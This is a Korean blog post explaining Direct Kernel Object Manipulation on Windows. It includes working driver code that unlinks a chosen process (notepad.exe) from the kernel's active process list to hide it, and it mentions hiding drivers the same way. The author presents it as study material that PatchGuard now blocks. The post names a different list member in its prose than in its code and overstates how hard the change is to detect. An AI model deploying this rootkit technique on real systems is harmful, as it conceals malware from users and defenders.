---
title: Direct Kernel Object Manipulation
published: 2024-11-27
description: 'PatchGuard가 없는 시대에 최강이었던 범부여..'
tags: [ Kernel ]
category: 'Windows'
draft: false 
---

쓸 게 없어서 고등학교 1학년 때 조사한 걸 올린다.

# [0x01] 개념

DKOM은 줄임말로, **D**irect **K**ernel **O**bject **M**anipulation의 줄임말이다. 이름에서 서술하듯이 커널 오브젝트를 다이렉트로 조작하는 것을 말한다.

우리는 이 개념을 이용해서 하나의 프로세스를 스텔스 프로세스로 만들 것이다.

Windows에서 프로세스 하나는 구조체 `EPROCESS`에 대응되는데, 이 구조체 안에 `SessionProcessLink` 멤버가 있다. 이는 프로세스 리스트를 순회하기 위해 만들어진 멤버이다.

이 멤버는 LIST_ENTRY 구조체인데, 이는 전 노드(`Blink`)와 후 노드(`Flink`)를 저장하는 엔트리이다. 자세한 개형:

```cpp
typedef struct _LIST_ENTRY {
  struct _LIST_ENTRY *Flink;
  struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;
```

여기서 프로세스를 숨기기 위해 타겟 프로세스의 `Flink` 와 `Blink` 를 바꾸는 작업을 수행할 수 있다.

# [0x02] 특징

`Flink` 와 `Blink` 를 바꾸는 작업은 회귀 불가적 성격을 띄기 때문에 탐지하기가 정말 어렵다.

DKOM은 그 개념 자체가 방대하여 프로세스를 숨기는 것 말고도 다른 용도로 쓰일 수 있다.

예를 들어, 프로세스 내의 쓰레드 또한 이러한 방법으로 숨길 수 있고, 로드된 커널 드라이버도 숨길 수 있다.

# [0x03] 구현

우선 우리는 프로세스가 생성될 때 만약 우리가 원하는 프로세스라면 DKOM을 하고 싶을 것이다. 이를 위한 아주 좋은 기술인 `ObRegisterCallbacks` 함수가 있다. 자세한 정보와 구현을 알고 싶다면 [여기](https://shhoya.github.io/antikernel_processprotect.html) 에 자세히 나와있으니 참고하기 바란다.

여기 `ObRegisterCallbacks` 에서 프로세스의 핸들을 제작할 때 콜백을 걸어서 추가적인 작업을 수행할 수 있다.

`GetOffset` 관련 함수는 [Portable EPROCESS Struct Offset](https://www.notion.so/Portable-EPROCESS-Struct-Offset-4caaaf432c474196a652e26a79646e67?pvs=21) 에 나와있다.

```c
void PostCallback(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION pOperationInformation)
{
	UNREFERENCED_PARAMETER(RegistrationContext);
	UNREFERENCED_PARAMETER(pOperationInformation);

	PLIST_ENTRY pListEntry = { 0, };
	char szProcName[16] = { 0, };
	strcpy_s(szProcName, 16, ((DWORD64)pOperationInformation->Object + iOffset.ImageFileName_off));
	if (!_strnicmp(szProcName, "notepad.exe", 16)) // to your process name
	{
		pListEntry = ((DWORD64)pOperationInformation->Object + iOffset.ActiveProcessLinks_off);
		if (pListEntry->Flink != NULL && pListEntry->Blink != NULL)
		{
			pListEntry->Flink->Blink = pListEntry->Blink;
			pListEntry->Blink->Flink = pListEntry->Flink;
			DbgPrintEx(DPFLTR_ACPI_ID, 0, "[+] The process is now Stealth");
			pListEntry->Flink = 0;
			pListEntry->Blink = 0;
		}
	}

	DbgPrintEx(DPFLTR_ACPI_ID, 0, "[+] Post Callback Routine");
}
```

밑의 사진을 보면 Process Explorer에 notepad.exe를 검색했는데 안 나오는 것을 보아 우리의 Stealth Process가 잘 만들어진 것 같다.

![Untitled](/dkom/Untitled.png)

## [0x3-A] Stealth Driver

드라이버 목록을 후킹할 때는 `ObRegisterCallbacks` 함수를 이용 안 해도 되고, `PsLoadedModuleList` 를 직접 DKOM 하면 된다. (더 쉬움)

# [0x4] 한계

PatchGuard는 DKOM을 엄격하게 잡는다. DKOM은 안 먹히니 공부용 목적으로만 사용하도록 하자.